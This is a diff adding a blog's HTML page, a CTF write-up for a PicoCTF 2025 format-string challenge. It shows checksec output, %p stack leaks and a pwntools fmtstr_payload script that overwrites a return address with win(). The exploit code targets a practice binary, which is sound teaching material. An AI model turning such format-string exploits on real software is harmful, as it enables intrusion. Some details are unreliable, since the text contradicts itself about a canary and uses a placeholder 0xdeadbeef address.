@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>PicoCTF 2025 — Format String Exploit: Leaking the Stack | homestarfuzzer</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="PicoCTF 2025 — Format String Exploit: Leaking the Stack" />
+<meta name="author" content="Austin McNett" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A classic format string vulnerability in a 64-bit ELF binary with partial RELRO and no canary. We leak a stack address, calculate the return address offset, and overwrite it with a win() function pointer." />
+<meta property="og:description" content="A classic format string vulnerability in a 64-bit ELF binary with partial RELRO and no canary. We leak a stack address, calculate the return address offset, and overwrite it with a win() function pointer." />
+<link rel="canonical" href="http://localhost:4000/writeups/2026-01-20-picoctf-format-string/" />
+<meta property="og:url" content="http://localhost:4000/writeups/2026-01-20-picoctf-format-string/" />
+<meta property="og:site_name" content="homestarfuzzer" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-20T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="PicoCTF 2025 — Format String Exploit: Leaking the Stack" />
+<meta name="twitter:site" content="@" />
+<meta name="twitter:creator" content="@Austin McNett" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Austin McNett"},"dateModified":"2026-01-20T00:00:00+00:00","datePublished":"2026-01-20T00:00:00+00:00","description":"A classic format string vulnerability in a 64-bit ELF binary with partial RELRO and no canary. We leak a stack address, calculate the return address offset, and overwrite it with a win() function pointer.","headline":"PicoCTF 2025 — Format String Exploit: Leaking the Stack","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2026-01-20-picoctf-format-string/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/avatar.png"},"name":"Austin McNett"},"url":"http://localhost:4000/writeups/2026-01-20-picoctf-format-string/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
+
+  <!-- Syntax highlighting -->
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="/assets/img/favicon.svg" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="homestarfuzzer" /></head>
+<body>
+  <header class="site-header">
+  <div class="container site-header__inner">
+    <a class="site-header__logo" href="/">
+      <span class="logo-bracket">[</span>homestarfuzzer<span class="logo-bracket">]</span>
+    </a>
+
+    <nav class="site-nav" aria-label="Main navigation">
+      <ul class="site-nav__list">
+        <li><a class="site-nav__link" href="/">Home</a></li>
+        <li><a class="site-nav__link" href="/writeups/">Writeups</a></li>
+        <li><a class="site-nav__link" href="/blog/">Blog</a></li>
+        <li><a class="site-nav__link" href="/about/">About</a></li>
+      </ul>
+    </nav>
+
+    <button class="site-header__menu-toggle" aria-label="Toggle menu" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</header>
+
+
+  <main class="main-content">
+    <article class="post writeup">
+  <header class="post__header writeup__header">
+    <div class="container">
+      <div class="post__meta">
+        <span class="post__category writeup-badge">CTF &mdash; PicoCTF 2025
+        </span>
+        <time class="post__date" datetime="2026-01-20T00:00:00+00:00">
+          January 20, 2026
+        </time>
+          <span class="difficulty difficulty--medium">Medium</span>
+      </div>
+
+      <h1 class="post__title">PicoCTF 2025 — Format String Exploit: Leaking the Stack</h1>
+        <p class="post__excerpt">A classic format string vulnerability in a 64-bit ELF binary with partial RELRO and no canary. We leak a stack address, calculate the return address offset, and overwrite it with a win() function pointer.
+</p>
+        <div class="post__tags">
+            <span class="tag">pwn</span>
+            <span class="tag">format-string</span>
+            <span class="tag">binary-exploitation</span>
+            <span class="tag">ctf</span>
+        </div>
+        <div class="writeup__tools">
+          <span class="tools-label">Tools:</span>
+            <code class="tool-badge">pwntools</code>
+            <code class="tool-badge">gdb</code>
+            <code class="tool-badge">pwndbg</code>
+            <code class="tool-badge">python</code>
+        </div>
+    </div>
+  </header>
+
+  <div class="post__body container">
+
+    <h2 id="challenge-overview">Challenge Overview</h2>
+
+<blockquote>
+  <p>“We found this binary on a server. Can you leak the flag?”</p>
+</blockquote>
+
+<p>The binary is a 64-bit ELF. Check protections:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span><span class="o">=</span>vuln
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE
+</code></pre></div></div>
+
+<p>No PIE and no canary — good candidates for a format string + GOT overwrite.</p>
+
+<hr />
+
+<h2 id="analysis">Analysis</h2>
+
+<p>Running the binary:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter your name: %p %p %p %p %p %p
+Hello 0x1 0x7ffd... (nil) 0x7f... 0x68732e... 0x...
+</code></pre></div></div>
+
+<p>Format string confirmed. We need to:</p>
+
+<ol>
+  <li>Find the offset of our input on the stack</li>
+  <li>Identify a useful address to leak or overwrite</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'%6$p'</span><span class="p">)</span>  <span class="c1"># brute-force offset
+</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>After fuzzing, offset <strong>6</strong> leaks the stack canary location (even though there’s
+no canary, it reveals a stack return address).</p>
+
+<hr />
+
+<h2 id="exploit">Exploit</h2>
+
+<p>With no PIE, <code class="language-plaintext highlighter-rouge">win()</code> has a static address. We use <code class="language-plaintext highlighter-rouge">%n</code> to overwrite the return
+address on the stack:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span>   <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+<span class="n">p</span>     <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+
+<span class="n">win</span>   <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'win'</span><span class="p">]</span>
+<span class="n">ret</span>   <span class="o">=</span> <span class="mh">0xdeadbeef</span>          <span class="c1"># find with gdb — offset to ret addr
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">ret</span><span class="p">:</span> <span class="n">win</span><span class="p">})</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Running it drops us into a shell and the flag is printed.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>picoCTF{f0rm4t_str1ng_f0r_th3_w1n_...}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ul>
+  <li>Format string bugs let you read and write arbitrary memory</li>
+  <li>Always check <code class="language-plaintext highlighter-rouge">checksec</code> before starting — No PIE + Partial RELRO is low-hanging fruit</li>
+  <li><code class="language-plaintext highlighter-rouge">pwntools</code>’ <code class="language-plaintext highlighter-rouge">fmtstr_payload</code> handles most of the heavy lifting</li>
+</ul>
+
+  </div>
+
+  <footer class="post__footer container">
+    <div class="post__nav">
+        <a class="post__nav-prev" href="/writeups/2026-03-15-htb-photobomb/">
+          <span class="nav-label">← Previous Writeup</span>
+          <span class="nav-title">Hack The Box — Photobomb: From LFI to Root via PATH Hijack</span>
+        </a>
+    </div>
+  </footer>
+</article>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container site-footer__inner">
+    <div class="site-footer__left">
+      <span class="site-footer__copy">&copy; 2026 Austin McNett</span>
+      <span class="site-footer__sep">//</span>
+      <a class="site-footer__rss" href="/feed.xml">RSS</a>
+    </div>
+    <div class="site-footer__links">
+        <a class="site-footer__link" href="https://github.com/homestarfuzzer" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+  <path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0 1 12 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/>
+</svg>
+
+        </a>
+        <a class="site-footer__link" href="https://twitter.com/" target="_blank" rel="noopener noreferrer" aria-label="Twitter/X">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+  <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+</svg>
+
+        </a>
+        <a class="site-footer__link" href="https://linkedin.com/in/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+  <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+</svg>
+
+        </a>
+    </div>
+  </div>
+</footer>
+
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
